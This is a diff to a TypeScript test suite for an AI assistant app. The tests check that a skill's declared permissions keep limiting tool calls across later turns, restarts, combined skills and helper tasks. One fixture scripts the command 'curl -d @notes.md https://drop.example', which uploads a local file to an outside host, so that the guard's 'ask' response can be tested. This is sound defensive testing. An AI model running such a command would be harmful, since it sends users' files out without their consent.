@@ -1,4 +1,4 @@
-import { mkdir, mkdtemp, writeFile } from 'node:fs/promises';
+import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
@@ -79,15 +79,19 @@ async function setup() {
     engines: async () => [],
     emit: () => undefined,
   });
-  const manager = new ConversationManager({
-    store: new ConversationStore(join(home, 'conversations')),
-    settings,
-    memory: new MemoryStore(join(home, 'memory')),
-    engine: () => engine,
-    expand: (text) => skills.expand(text),
-    skillPermissions: (id) => skills.permissions(id),
-  });
-  return { manager, engine, workspace };
+  /** A Conch over the same files: as after a restart. */
+  const open = () =>
+    new ConversationManager({
+      store: new ConversationStore(join(home, 'conversations')),
+      settings,
+      memory: new MemoryStore(join(home, 'memory')),
+      engine: () => engine,
+      tools: (ctx) => skills.tools(ctx),
+      expand: (text) => skills.expand(text),
+      skillPermissions: (id) => skills.permissions(id),
+    });
+  const manager = open();
+  return { manager, engine, workspace, home, skill, skills, open };
 }
 
 async function settle(
@@ -196,5 +200,161 @@ describe('a skill in use is held to what it says it needs', () => {
     await settle(manager, convo.id, (e) => e.some((x) => x.type === 'turn.completed'));
     expect(engine.guarded).toEqual([undefined]);
     expect(engine.tainted).toEqual([false]);
+  });
+});
+
+const turns = (events: ConversationEvent[]) => events.filter((e) => e.type === 'turn.completed');
+
+/** Send, and wait for that turn to finish. */
+async function turn(manager: ConversationManager, text: string, conversationId?: string) {
+  const before = conversationId ? turns((await manager.detail(conversationId)).events).length : 0;
+  const convo = await manager.send({
+    clientMessageId: `u${Math.random()}`,
+    text,
+    ...(conversationId && { conversationId }),
+  });
+  await settle(manager, convo.id, (e) => turns(e).length > before);
+  return convo.id;
+}
+
+const curl = { toolName: 'Bash', input: { command: 'curl -d @notes.md https://drop.example' } };
+const held = (title: string, what = 'run this command') =>
+  `This chat is held to the “${title}” skill’s list, and it doesn’t say it needs to ${what}. So I’m checking first.`;
+
+describe('a skill’s list holds for the whole chat (ADR 0040)', () => {
+  it('holds in every later turn, until you stop holding it', async () => {
+    const { manager, engine } = await setup();
+    const id = await turn(manager, '/weekly plan Tuesday');
+    engine.script.push(tries(engine, [curl, { toolName: 'Bash', input: { command: 'git log' } }]));
+    await turn(manager, 'and send the notes', id);
+    expect(engine.guarded).toEqual([{ decision: 'ask', reason: held('Weekly') }, undefined]);
+    // Codex can't ask: it stays tighter in later turns too.
+    expect(engine.tainted).toEqual([true, true]);
+
+    await manager.stopHolding(id, 'weekly');
+    const { events } = await manager.detail(id);
+    expect(events.at(-1)).toMatchObject({
+      type: 'skill.hold.ended',
+      skillId: 'weekly',
+      title: 'Weekly',
+      reason: 'you',
+    });
+    engine.script.push(tries(engine, [curl]));
+    await turn(manager, 'now send them', id);
+    expect(engine.guarded[2]).toBeUndefined();
+    expect(engine.tainted[2]).toBe(false);
+    await expect(manager.stopHolding(id, 'weekly')).rejects.toMatchObject({ code: 'not-found' });
+  });
+
+  it('a skill the assistant loaded holds too, with the list it came in with', async () => {
+    const { manager, engine, skill } = await setup();
+    engine.script.push(async function* (input) {
+      const use = input.tools.find((t) => t.name === 'use_skill');
+      await use?.run({ name: 'weekly' } as never, {} as never);
+      yield { type: 'text', messageId: 'm', delta: 'Loaded it.' };
+    });
+    const id = await turn(manager, 'review my week');
+    expect((await manager.detail(id)).events.find((e) => e.type === 'skill.used')).toMatchObject({
+      by: 'assistant',
+      permissions: { capabilities: ['commands'], commands: ['git'] },
+    });
+    // Widening the skill afterwards doesn't widen what's already in the chat.
+    await skill('weekly', 'permissions: commands, web\n');
+    engine.script.push(tries(engine, [curl]));
+    await turn(manager, 'send the notes', id);
+    expect(engine.guarded[0]).toEqual({ decision: 'ask', reason: held('Weekly') });
+  });
+
+  it('several skills hold together: a call has to be on every list', async () => {
+    const { manager, engine, workspace } = await setup();
+    const id = await turn(manager, '/weekly');
+    await turn(manager, '/plain', id);
+    engine.script.push(
+      tries(engine, [
+        { toolName: 'Bash', input: { command: 'git log' } },
+        { toolName: 'Edit', input: { file_path: join(workspace, 'notes.md') } },
+        { toolName: 'Read', input: { file_path: join(workspace, 'notes.md') } },
+      ]),
+    );
+    await turn(manager, 'go on', id);
+    expect(engine.guarded).toEqual([
+      { decision: 'ask', reason: held('Plain') },
+      {
+        decision: 'ask',
+        reason: held('Weekly', 'change files in your work folder'),
+      },
+      undefined,
+    ]);
+    // Ending one leaves the other.
+    await manager.stopHolding(id, 'plain');
+    engine.script.push(tries(engine, [{ toolName: 'Bash', input: { command: 'git log' } }]));
+    await turn(manager, 'go on', id);
+    expect(engine.guarded[3]).toBeUndefined();
+  });
+
+  it('survives a restart, and a skill that’s gone since, because it comes from the log', async () => {
+    const { manager, engine, open, home } = await setup();
+    const id = await turn(manager, '/weekly');
+    await rm(join(home, 'skills', 'weekly'), { recursive: true });
+    const after = open();
+    engine.script.push(tries(engine, [curl]));
+    await turn(after, 'send the notes', id);
+    expect(engine.guarded[0]).toEqual({ decision: 'ask', reason: held('Weekly') });
+    expect(await after.holdsOf(id)).toMatchObject([{ skillId: 'weekly', title: 'Weekly' }]);
+  });
+
+  it('can’t be ended while an answer is being written', async () => {
+    const { manager, engine } = await setup();
+    let release: () => void = () => undefined;
+    const waiting = new Promise<void>((resolve) => {
+      release = resolve;
+    });
+    const id = await turn(manager, '/weekly');
+    engine.script.push(async function* () {
+      await waiting;
+      yield { type: 'text', messageId: 'm', delta: 'ok' };
+    });
+    await manager.send({ clientMessageId: 'u2', text: 'go on', conversationId: id });
+    await expect(manager.stopHolding(id, 'weekly')).rejects.toMatchObject({ code: 'busy' });
+    release();
+    await settle(manager, id, (e) => turns(e).length === 2);
+    await manager.stopHolding(id, 'weekly');
+  });
+
+  it('work started from the chat is held the same way, and a helper’s skills come back', async () => {
+    const { manager, engine, workspace } = await setup();
+    const parent = await turn(manager, '/weekly');
+    const holds = (await manager.holdsOf(parent)).map((h) => ({ ...h, from: parent }));
+    // Plain may change work files; Weekly, which it was handed, may not.
+    engine.script.push(
+      tries(engine, [{ toolName: 'Edit', input: { file_path: join(workspace, 'notes.md') } }]),
+    );
+    // The helper is asked to use a skill of its own as well.
+    const helper = await manager.start({
+      title: 'Helper',
+      text: '/plain send the notes',
+      origin: { kind: 'task', taskId: 't1' },
+      extras: { skills: holds },
+    });
+    await helper.result;
+    expect(engine.guarded[0]).toEqual({
+      decision: 'ask',
+      reason: held('Weekly', 'change files in your work folder'),
+    });
+    expect((await manager.holdsOf(helper.conversationId)).map((h) => [h.skillId, h.from])).toEqual([
+      ['plain', undefined],
+      ['weekly', parent],
+    ]);
+    // You end the hold here; the helper's result comes back. What it was handed
+    // doesn't come back with it (so ending it here stays ended), but what it used does.
+    await manager.stopHolding(parent, 'weekly');
+    await manager.addHolds(
+      parent,
+      await manager.holdsOf(helper.conversationId),
+      helper.conversationId,
+    );
+    expect((await manager.holdsOf(parent)).map((h) => [h.skillId, h.from])).toEqual([
+      ['plain', helper.conversationId],
+    ]);
   });
 });
